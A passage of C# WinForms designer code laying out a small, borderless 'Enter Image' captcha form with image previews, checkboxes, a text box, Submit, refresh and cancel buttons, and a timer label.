            this.txtImageData.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // lblWrongCaptcha
            // 
            this.lblWrongCaptcha.Font = new System.Drawing.Font("Calibri", 8.25F, System.Drawing.FontStyle.Bold);
            this.lblWrongCaptcha.ForeColor = System.Drawing.Color.Black;
            this.lblWrongCaptcha.Location = new System.Drawing.Point(322, 69);
            this.lblWrongCaptcha.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.lblWrongCaptcha.Name = "lblWrongCaptcha";
            this.lblWrongCaptcha.Size = new System.Drawing.Size(200, 20);
            this.lblWrongCaptcha.TabIndex = 13;
            this.lblWrongCaptcha.Text = "Captcha, Enter Again";
            this.lblWrongCaptcha.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // chkDark
            // 
            this.chkDark.AutoSize = true;
            this.chkDark.BackColor = System.Drawing.Color.Red;
            this.chkDark.Checked = true;
            this.chkDark.CheckState = System.Windows.Forms.CheckState.Checked;
            this.chkDark.Location = new System.Drawing.Point(486, 135);
            this.chkDark.Margin = new System.Windows.Forms.Padding(4);
            this.chkDark.Name = "chkDark";
            this.chkDark.Size = new System.Drawing.Size(18, 17);
            this.chkDark.TabIndex = 14;
            this.chkDark.UseVisualStyleBackColor = false;
            this.chkDark.CheckedChanged += new System.EventHandler(this.chkDark_CheckedChanged);
            // 
            // chkThin
            // 
            this.chkThin.AutoSize = true;
            this.chkThin.Checked = true;
            this.chkThin.CheckState = System.Windows.Forms.CheckState.Checked;
            this.chkThin.Location = new System.Drawing.Point(486, 49);
            this.chkThin.Margin = new System.Windows.Forms.Padding(4);
            this.chkThin.Name = "chkThin";
            this.chkThin.Size = new System.Drawing.Size(18, 17);
            this.chkThin.TabIndex = 15;
            this.chkThin.UseVisualStyleBackColor = true;
            this.chkThin.CheckedChanged += new System.EventHandler(this.chkThin_CheckedChanged);
            // 
            // chkDarkLarge
            // 
            this.chkDarkLarge.AutoSize = true;
            this.chkDarkLarge.Location = new System.Drawing.Point(486, 226);
            this.chkDarkLarge.Margin = new System.Windows.Forms.Padding(4);
            this.chkDarkLarge.Name = "chkDarkLarge";
            this.chkDarkLarge.Size = new System.Drawing.Size(18, 17);
            this.chkDarkLarge.TabIndex = 16;
            this.chkDarkLarge.UseVisualStyleBackColor = true;
            this.chkDarkLarge.CheckedChanged += new System.EventHandler(this.chkDarkLarge_CheckedChanged);
            // 
            // pnlCaptcha
            // 
            this.pnlCaptcha.BackColor = System.Drawing.Color.White;
            this.pnlCaptcha.Controls.Add(this.btnSubmit);
            this.pnlCaptcha.Controls.Add(this.txtImageData);
            this.pnlCaptcha.Controls.Add(this.picOriginal);
            this.pnlCaptcha.Controls.Add(this.chkDarkLarge);
            this.pnlCaptcha.Controls.Add(this.chkThin);
            this.pnlCaptcha.Controls.Add(this.chkDark);
            this.pnlCaptcha.Controls.Add(this.picDarkLarge);
            this.pnlCaptcha.Controls.Add(this.label4);
            this.pnlCaptcha.Controls.Add(this.label3);
            this.pnlCaptcha.Controls.Add(this.picDark);
            this.pnlCaptcha.Controls.Add(this.label2);
            this.pnlCaptcha.Controls.Add(this.picThin);
            this.pnlCaptcha.Controls.Add(this.label1);
            this.pnlCaptcha.Controls.Add(this.lnkOTP);
            this.pnlCaptcha.Location = new System.Drawing.Point(0, 24);
            this.pnlCaptcha.Margin = new System.Windows.Forms.Padding(2);
            this.pnlCaptcha.Name = "pnlCaptcha";
            this.pnlCaptcha.Size = new System.Drawing.Size(274, 111);
            this.pnlCaptcha.TabIndex = 1;
            // 
            // btnSubmit
            // 
            this.btnSubmit.BackColor = System.Drawing.Color.Lime;
            this.btnSubmit.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.8F, System.Drawing.FontStyle.Bold);
            this.btnSubmit.ForeColor = System.Drawing.Color.Black;
            this.btnSubmit.Location = new System.Drawing.Point(170, 76);
            this.btnSubmit.Margin = new System.Windows.Forms.Padding(2);
            this.btnSubmit.Name = "btnSubmit";
            this.btnSubmit.Size = new System.Drawing.Size(101, 28);
            this.btnSubmit.TabIndex = 1195;
            this.btnSubmit.Text = "Submit";
            this.btnSubmit.UseVisualStyleBackColor = false;
            this.btnSubmit.Click += new System.EventHandler(this.btnSubmit_Click);
            // 
            // picOriginal
            // 
            this.picOriginal.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.picOriginal.Location = new System.Drawing.Point(2, 2);
            this.picOriginal.Margin = new System.Windows.Forms.Padding(2);
            this.picOriginal.Name = "picOriginal";
            this.picOriginal.Size = new System.Drawing.Size(269, 71);
            this.picOriginal.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.picOriginal.TabIndex = 0;
            this.picOriginal.TabStop = false;
            // 
            // picDarkLarge
            // 
            this.picDarkLarge.BackColor = System.Drawing.Color.White;
            this.picDarkLarge.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.picDarkLarge.Location = new System.Drawing.Point(482, 246);
            this.picDarkLarge.Margin = new System.Windows.Forms.Padding(4);
            this.picDarkLarge.Name = "picDarkLarge";
            this.picDarkLarge.Size = new System.Drawing.Size(238, 92);
            this.picDarkLarge.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.picDarkLarge.TabIndex = 7;
            this.picDarkLarge.TabStop = false;
            this.picDarkLarge.Visible = false;
            // 
            // picDark
            // 
            this.picDark.BackColor = System.Drawing.Color.White;
            this.picDark.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.picDark.Location = new System.Drawing.Point(482, 155);
            this.picDark.Margin = new System.Windows.Forms.Padding(4);
            this.picDark.Name = "picDark";
            this.picDark.Size = new System.Drawing.Size(161, 62);
            this.picDark.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.picDark.TabIndex = 4;
            this.picDark.TabStop = false;
            // 
            // picThin
            // 
            this.picThin.BackColor = System.Drawing.Color.White;
            this.picThin.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.picThin.Location = new System.Drawing.Point(482, 69);
            this.picThin.Margin = new System.Windows.Forms.Padding(4);
            this.picThin.Name = "picThin";
            this.picThin.Size = new System.Drawing.Size(173, 62);
            this.picThin.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.picThin.TabIndex = 2;
            this.picThin.TabStop = false;
            // 
            // lblTime
            // 
            this.lblTime.AutoSize = true;
            this.lblTime.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.lblTime.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblTime.ForeColor = System.Drawing.Color.Red;
            this.lblTime.Location = new System.Drawing.Point(325, 105);
            this.lblTime.Margin = new System.Windows.Forms.Padding(0);
            this.lblTime.Name = "lblTime";
            this.lblTime.Size = new System.Drawing.Size(100, 27);
            this.lblTime.TabIndex = 1190;
            this.lblTime.Text = "00:00:00";
            this.lblTime.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.lblTime.Visible = false;
            // 
            // timer_1
            // 
            this.timer_1.Interval = 500;
            this.timer_1.Tick += new System.EventHandler(this.timer_1_Tick);
            // 
            // bunifuElipse_0
            // 
            this.bunifuElipse_0.ElipseRadius = 5;
            this.bunifuElipse_0.TargetControl = this;
            // 
            // pnlHeader
            // 
            this.pnlHeader.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.pnlHeader.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.pnlHeader.Controls.Add(this.tktname);
            this.pnlHeader.Controls.Add(this.btnCancel);
            this.pnlHeader.Dock = System.Windows.Forms.DockStyle.Top;
            this.pnlHeader.Location = new System.Drawing.Point(0, 0);
            this.pnlHeader.Margin = new System.Windows.Forms.Padding(4);
            this.pnlHeader.Name = "pnlHeader";
            this.pnlHeader.Size = new System.Drawing.Size(276, 22);
            this.pnlHeader.TabIndex = 1189;
            // 
            // tktname
            // 
            this.tktname.AutoSize = true;
            this.tktname.BackColor = System.Drawing.Color.Transparent;
            this.tktname.ForeColor = System.Drawing.Color.White;
            this.tktname.Location = new System.Drawing.Point(-1, 2);
            this.tktname.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.tktname.Name = "tktname";
            this.tktname.Size = new System.Drawing.Size(51, 15);
            this.tktname.TabIndex = 1189;
            this.tktname.Text = "tktname";
            // 
            // btnCancel
            // 
            this.btnCancel.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btnCancel.BackColor = System.Drawing.Color.Transparent;
            this.btnCancel.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnCancel.Image = ((System.Drawing.Image)(resources.GetObject("btnCancel.Image")));
            this.btnCancel.ImageActive = null;
            this.btnCancel.Location = new System.Drawing.Point(254, -1);
            this.btnCancel.Margin = new System.Windows.Forms.Padding(4);
            this.btnCancel.Name = "btnCancel";
            this.btnCancel.Size = new System.Drawing.Size(19, 19);
            this.btnCancel.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.btnCancel.TabIndex = 1188;
            this.btnCancel.TabStop = false;
            this.btnCancel.Zoom = 10;
            this.btnCancel.Click += new System.EventHandler(this.btnCancel_Click);
            // 
            // btnReferesh
            // 
            this.btnReferesh.BackColor = System.Drawing.Color.Yellow;
            this.btnReferesh.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnReferesh.Image = ((System.Drawing.Image)(resources.GetObject("btnReferesh.Image")));
            this.btnReferesh.ImageActive = null;
            this.btnReferesh.Location = new System.Drawing.Point(316, 158);
            this.btnReferesh.Margin = new System.Windows.Forms.Padding(4);
            this.btnReferesh.Name = "btnReferesh";
            this.btnReferesh.Size = new System.Drawing.Size(22, 29);
            this.btnReferesh.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.btnReferesh.TabIndex = 1189;
            this.btnReferesh.TabStop = false;
            this.btnReferesh.Zoom = 10;
            this.btnReferesh.Click += new System.EventHandler(this.btnReferesh_Click);
            // 
            // frmCaptcha
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(120F, 120F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.BackColor = System.Drawing.SystemColors.Control;
            this.ClientSize = new System.Drawing.Size(276, 138);
            this.ControlBox = false;
            this.Controls.Add(this.pnlHeader);
            this.Controls.Add(this.lblTime);
            this.Controls.Add(this.pnlCaptcha);
            this.Controls.Add(this.btnReferesh);
            this.Controls.Add(this.lblWrongCaptcha);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(4);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "frmCaptcha";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "Enter Image";
            this.TopMost = true;
            this.Shown += new System.EventHandler(this.frmCaptcha_Shown);
            this.pnlCaptcha.ResumeLayout(false);
            this.pnlCaptcha.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picOriginal)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picDarkLarge)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picDark)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picThin)).EndInit();
            this.pnlHeader.ResumeLayout(false);
            this.pnlHeader.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.btnCancel)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnReferesh)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

	}
}
